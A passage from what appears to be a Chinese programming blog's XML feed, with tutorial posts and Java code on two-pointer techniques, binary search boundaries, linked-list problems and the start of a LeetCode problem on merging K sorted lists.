class="keyword">return</span> memo[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;求最值问题，比如最长序列、最短距离等，不考虑时间和空间都可以通过暴力穷举的方式遍历获得结果，通过对穷举的过程进行优化减少重复开销的过程，即动态规划。&lt;/p&gt;
&lt;p&gt;动态规划的重点，就是如何确定 &lt;code&gt;状态转移方程&lt;/code&gt; 和 通过 &lt;code&gt;备忘录&lt;/code&gt; 空间换时间降低时间复杂度（优化穷举）。&lt;/p&gt;</summary>
    
    
    
    <category term="动态规划" scheme="https://blog.zhengxiangling.com/categories/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
    
  </entry>
  
  <entry>
    <title>双指针秒杀数组、字符串操作题</title>
    <link href="https://blog.zhengxiangling.com/2023/10/16/%E5%8F%8C%E6%8C%87%E9%92%88%E7%A7%92%E6%9D%80%E6%95%B0%E7%BB%84%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E9%A2%98/"/>
    <id>https://blog.zhengxiangling.com/2023/10/16/%E5%8F%8C%E6%8C%87%E9%92%88%E7%A7%92%E6%9D%80%E6%95%B0%E7%BB%84%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E9%A2%98/</id>
    <published>2023-10-16T00:12:00.000Z</published>
    <updated>2023-11-17T14:27:30.009Z</updated>
    
    <content type="html"><![CDATA[<p>双指针的操作方法包括快慢指针（滑动窗口）、左右指针和中间向两端扩散指针，掌握这些指针操作方法，可以秒杀大多操作数组和字符串的题目。</p><p>重点为滑动窗口和左右指针，左右指针的二分查找包括求查找中间值和左右边界值的写法。</p><span id="more"></span><h5 id="快慢指针（滑动窗口）"><a href="#快慢指针（滑动窗口）" class="headerlink" title="快慢指针（滑动窗口）"></a>快慢指针（滑动窗口）</h5><p>快慢指针的意思为，两个指针，<code>fast</code>指针在前面探路，<code>slow</code>指针负责在移动前做判断条件，然后再移动，两个指针覆盖的长度即为要找的元素空间，这种操作方式也叫做<code>滑动窗口</code>。</p><p>常见的快慢指针题目：找满足条件的最长子串、删除排序的重复元素等。</p><p>滑动窗口算法框架：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* 滑动窗口算法框架 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">slidingWindow</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">    HashMap&lt;Character, Integer&gt; need = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    HashMap&lt;Character, Integer&gt; window = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> c : t.toCharArray()) need.put(c, need.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">valid</span> <span class="operator">=</span> <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span> (right &lt; s.length()) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(right);</span><br><span class="line">        <span class="comment">// 右移（增大）窗口</span></span><br><span class="line">        right++;</span><br><span class="line">        <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">        <span class="keyword">if</span> (need.containsKey(c)) &#123;</span><br><span class="line">            window.put(c, window.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (window.get(c).equals(need.get(c))) valid++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (window needs shrink) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">d</span> <span class="operator">=</span> s.charAt(left);</span><br><span class="line">            <span class="comment">// 左移（缩小）窗口</span></span><br><span class="line">            left++;</span><br><span class="line">            <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">            <span class="keyword">if</span> (need.containsKey(d)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (window.get(d).equals(need.get(d))) valid--;</span><br><span class="line">                window.put(d, window.getOrDefault(d, <span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="左右指针"><a href="#左右指针" class="headerlink" title="左右指针"></a>左右指针</h5><p>左右指针即为最开始，左指针<code>left</code>在数组的最开始位置，右指针<code>right</code>在数组的末尾，然后循环时在判断左右指针什么时候开始相向移动，直至<code>left == right</code>左右指针相遇。</p><p>常见题目：二分查找，求两数之和、反转数组等。</p><p>重点为<code>二分查找</code>，二分查找的数组可能包含重复值，重复值的寻找条件可能包含第一寻找到相同元素返回、寻找指定元素的最左边界位置、寻找指定元素的最右边界位置等三种情况。三种边界的区别在于，寻找到指定元素后是否需要第一时间返回位置值，即<code>nums[mid]==target</code>时的操作不同，可见下列算法。</p><p>算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">binary_search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>; </span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>; </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] == target) &#123;</span><br><span class="line">            <span class="comment">// 直接返回</span></span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 直接返回</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">left_bound</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">            <span class="comment">// 别返回，锁定左侧边界</span></span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断 target 是否存在于 nums 中</span></span><br><span class="line">    <span class="keyword">if</span> (left &lt; <span class="number">0</span> || left &gt;= nums.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断一下 nums[left] 是不是 target</span></span><br><span class="line">    <span class="keyword">return</span> nums[left] == target ? left : -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">right_bound</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">            <span class="comment">// 别返回，锁定右侧边界</span></span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断 target 是否存在于 nums 中</span></span><br><span class="line">    <span class="comment">// if (left - 1 &lt; 0 || left - 1 &gt;= nums.length) &#123;</span></span><br><span class="line">    <span class="comment">//     return -1;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 由于 while 的结束条件是 right == left - 1，且现在在求右边界</span></span><br><span class="line">    <span class="comment">// 所以用 right 替代 left - 1 更好记</span></span><br><span class="line">    <span class="keyword">if</span> (right &lt; <span class="number">0</span> || right &gt;= nums.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[right] == target ? right : -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="中间向两端扩散指针"><a href="#中间向两端扩散指针" class="headerlink" title="中间向两端扩散指针"></a>中间向两端扩散指针</h5><p>中间向两端扩散，即左右指针分别朝左右两边扩散，常见为<code>寻找回文子串</code>，判断回文子串的重点为判断子串的长度是奇数还是偶数。</p><p>从给定位置寻找回文子串的算法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 s 中寻找以 s[l] 和 s[r] 为中心的最长回文串</span></span><br><span class="line">String <span class="title function_">palindrome</span><span class="params">(String s, <span class="type">int</span> l, <span class="type">int</span> r)</span> &#123;</span><br><span class="line">    <span class="comment">// 防止索引越界</span></span><br><span class="line">    <span class="keyword">while</span> (l &gt;= <span class="number">0</span> &amp;&amp; r &lt; s.length()</span><br><span class="line">            &amp;&amp; s.charAt(l) == s.charAt(r)) &#123;</span><br><span class="line">        <span class="comment">// 双指针，向两边展开</span></span><br><span class="line">        l--; r++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回以 s[l] 和 s[r] 为中心的最长回文串</span></span><br><span class="line">    <span class="keyword">return</span> s.substring(l + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后寻找给定字符串的最长回文子串：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String <span class="title function_">longestPalindrome</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        <span class="comment">// 以 s[i] 为中心的最长回文子串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> palindrome(s, i, i);</span><br><span class="line">        <span class="comment">// 以 s[i] 和 s[i+1] 为中心的最长回文子串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> palindrome(s, i, i + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// res = longest(res, s1, s2)</span></span><br><span class="line">        res = res.length() &gt; s1.length() ? res : s1;</span><br><span class="line">        res = res.length() &gt; s2.length() ? res : s2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;双指针的操作方法包括快慢指针（滑动窗口）、左右指针和中间向两端扩散指针，掌握这些指针操作方法，可以秒杀大多操作数组和字符串的题目。&lt;/p&gt;
&lt;p&gt;重点为滑动窗口和左右指针，左右指针的二分查找包括求查找中间值和左右边界值的写法。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="双指针" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    
    
    <category term="滑动窗口" scheme="https://blog.zhengxiangling.com/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>链表的逻辑相关，寻找倒数第 K 个节点、寻找中间位置、判断是否有环、判断两个链表是否相交等</title>
    <link href="https://blog.zhengxiangling.com/2023/10/13/%E9%93%BE%E8%A1%A8%E7%9A%84%E9%80%BB%E8%BE%91%E7%9B%B8%E5%85%B3%EF%BC%8C%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E5%80%92%E6%95%B0%E7%AC%AC-K-%E4%B8%AA%E8%8A%82%E7%82%B9%E3%80%81%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%97%B4%E4%BD%8D%E7%BD%AE%E3%80%81%E5%88%A4%E6%96%AD%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF%E3%80%81%E5%88%A4%E6%96%AD%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E7%9B%B8%E4%BA%A4/"/>
    <id>https://blog.zhengxiangling.com/2023/10/13/%E9%93%BE%E8%A1%A8%E7%9A%84%E9%80%BB%E8%BE%91%E7%9B%B8%E5%85%B3%EF%BC%8C%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E5%80%92%E6%95%B0%E7%AC%AC-K-%E4%B8%AA%E8%8A%82%E7%82%B9%E3%80%81%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%97%B4%E4%BD%8D%E7%BD%AE%E3%80%81%E5%88%A4%E6%96%AD%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF%E3%80%81%E5%88%A4%E6%96%AD%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E7%9B%B8%E4%BA%A4/</id>
    <published>2023-10-13T08:10:00.000Z</published>
    <updated>2023-11-17T14:27:30.012Z</updated>
    
    <content type="html"><![CDATA[<p>本章主要介绍链表相关的逻辑操作，包括寻找倒数第 K 个节点、寻找中间位置、判断是否有环、判断两个链表是否相交等。</p><span id="more"></span><h5 id="寻找倒数第-K-个节点"><a href="#寻找倒数第-K-个节点" class="headerlink" title="寻找倒数第 K 个节点"></a>寻找倒数第 K 个节点</h5><p>链表不同于数组，一开始并不知道长度，可通过找数据规律求解，如链表长度为 <code>n</code>，倒数第 <code>K</code> 个节点转化过来即为顺数第 <code>n-K+1</code> 个节点，可通过先遍历整个链表得出长度 <code>n</code>，再第二次遍历到<code>n-K+1</code>得到寻找节点。</p><p>但是上述需要循环两次遍历。</p><p>我们也可以通过一次遍历来实现（最优解）。运用双指针，指针 <code>p1</code> 从头结点先走 <code>k</code> 步，距离末尾空指针还剩 <code>n-k</code> 步，此时让 <code>p2</code> 指向链表头结点，<code>p1</code> 和 <code>p2</code> 同时走 <code>n-k</code> 步，此时 <code>p2</code> 在链尾 <code>null</code>，<code>p1</code> 正好在顺数第 <code>n-K+1</code> 个节点，即为倒数第 <code>K</code> 个节点，即为所求，算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回链表的倒数第 k 个节点</span></span><br><span class="line">ListNode <span class="title function_">findFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p1</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="comment">// p1 先走 k 步</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        p1 = p1.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p2</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="comment">// p1 和 p2 同时走 n - k 步</span></span><br><span class="line">    <span class="keyword">while</span> (p1 != <span class="literal">null</span>) &#123;</span><br><span class="line">        p2 = p2.next;</span><br><span class="line">        p1 = p1.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// p2 现在指向第 n - k + 1 个节点，即倒数第 k 个节点</span></span><br><span class="line">    <span class="keyword">return</span> p2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="寻找链表中间位置"><a href="#寻找链表中间位置" class="headerlink" title="寻找链表中间位置"></a>寻找链表中间位置</h5><p>常规做法，我们先遍历整个链表寻找长度 <code>n</code>，然后在遍历 <code>n/2</code>寻找中间位置。</p><p>但是最优解可以通过一次循环来实现。</p><p>运用 <code>快慢指针</code> 的思想，让两个指针 <code>slow</code> <code>fast</code> 同时从头结点出发， <code>slow</code> 走一步,<code>fast</code> 走两步，当 <code>fast</code> 为空或者 <code>fast</code> 的下一节点为空，<code>slow</code> 则走到了中点位置，即为所求。算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ListNode <span class="title function_">middleNode</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="comment">// 快慢指针初始化指向 head</span></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head, fast = head;</span><br><span class="line">    <span class="comment">// 快指针走到末尾时停止</span></span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 慢指针走一步，快指针走两步</span></span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 慢指针指向中点</span></span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="判断链表是否有环"><a href="#判断链表是否有环" class="headerlink" title="判断链表是否有环"></a>判断链表是否有环</h5><p>思想也为运用 <code>快慢指针</code>，让两个指针 <code>slow</code> <code>fast</code> 同时从头结点出发， <code>slow</code> 走一步,<code>fast</code> 走两步，如果两个指针相遇在同一位置，则证明有环；当 <code>fast</code> 为空或者 <code>fast</code> 的下一节点为空，则证明没有环，算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">hasCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="comment">// 快慢指针初始化指向 head</span></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head, fast = head;</span><br><span class="line">    <span class="comment">// 快指针走到末尾时停止</span></span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 慢指针走一步，快指针走两步</span></span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        <span class="comment">// 快慢指针相遇，说明含有环</span></span><br><span class="line">        <span class="keyword">if</span> (slow == fast) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不包含环</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="判断两个链表是否相交，并返回相交节点"><a href="#判断两个链表是否相交，并返回相交节点" class="headerlink" title="判断两个链表是否相交，并返回相交节点"></a>判断两个链表是否相交，并返回相交节点</h5><p>此解法我们可以做如下模拟，其中两个链表相交的点为 <code>3</code><br><br>链表1 <code>1,3,5,6,7</code>, <br><br>链表2 <code>2,3,4,8,9</code>, <br>,<br>然后把链表拼接如下 <br><br>链表1 + 链表2 = 1,3,5,6,7,2,<code>3</code>,4,8,9 <br><br>链表2 + 链表1 = 2,3,4,8,9,1,<code>3</code>,5,6,7</p><p>可以看出两条链表拼接之后，用两个指针分别同时前进，遇到相遇时，该节点即为相交节点。算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">    <span class="comment">// p1 指向 A 链表头结点，p2 指向 B 链表头结点</span></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p1</span> <span class="operator">=</span> headA, p2 = headB;</span><br><span class="line">    <span class="keyword">while</span> (p1 != p2) &#123;</span><br><span class="line">        <span class="comment">// p1 走一步，如果走到 A 链表末尾，转到 B 链表</span></span><br><span class="line">        <span class="keyword">if</span> (p1 == <span class="literal">null</span>) p1 = headB;</span><br><span class="line">        <span class="keyword">else</span>            p1 = p1.next;</span><br><span class="line">        <span class="comment">// p2 走一步，如果走到 B 链表末尾，转到 A 链表</span></span><br><span class="line">        <span class="keyword">if</span> (p2 == <span class="literal">null</span>) p2 = headA;</span><br><span class="line">        <span class="keyword">else</span>            p2 = p2.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;本章主要介绍链表相关的逻辑操作，包括寻找倒数第 K 个节点、寻找中间位置、判断是否有环、判断两个链表是否相交等。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="链表" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"/>
    
    
    <category term="快慢指针" scheme="https://blog.zhengxiangling.com/tags/%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88/"/>
    
  </entry>
  
  <entry>
    <title>No.23 合并 K 个升序链表</title>
    <link href="https://blog.zhengxiangling.com/2023/10/11/o-23-%E5%90%88%E5%B9%B6-K-%E4%B8%AA%E9%93%BE%E8%A1%A8/"/>
    <id>https://blog.zhengxiangling.com/2023/10/11/o-23-%E5%90%88%E5%B9%B6-K-%E4%B8%AA%E9%93%BE%E8%A1%A8/</id>
    <published>2023-10-11T11:46:00.000Z</published>
    <updated>2023-11-17T14:27:30.006Z</updated>
    
    <content type="html"><![CDATA[<p>困难等级。</p><p>给你一个链表数组，每个链表都已经按升序排列。<br>请你将所有链表合并到一个升序链表中，返回合并后的链表。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">示例 1：</span><br><span class="line">输入：lists = [[1,4,5],[1,3,4],[2,6]]</span><br><span class="line">输出：[1,1,2,3,4,4,5,6]</span><br><span class="line">解释：链表数组如下：</span><br><span class="line">[</span><br><span class="line">  1-&gt;4-&gt;5,</span><br><span class="line">  1-&gt;3-&gt;4,</span><br><span class="line">  2-&gt;6</span><br><span class="line">]</span><br><span class="line">将它们合并到一个有序链表中得到。</span><br><span class="line">1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：lists = []</span><br><span class="line">输出：[]</span><br><span class="line"></span><br><span class="line">示例 3：</span><br><span class="line">输入：lists = [[]]</span><br><span class="line">输出：[] </span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">k == lists.length</span><br><span class="line">0 &lt;= k &lt;= 10^4</span><br><span class="line">0 &lt;= lists[i].length &lt;= 500</span><br><span class="line">-10^4 &lt;= lists[i][j] &lt;= 10^4</span><br><span class="line">lists[i] 按 升序 排列</span><br><span class="line">lists[i].length 的总和不超过 10^4</span><br></pre></td></tr></table></figure><h5 id="思路"><a href="#思路" class="headerlink" 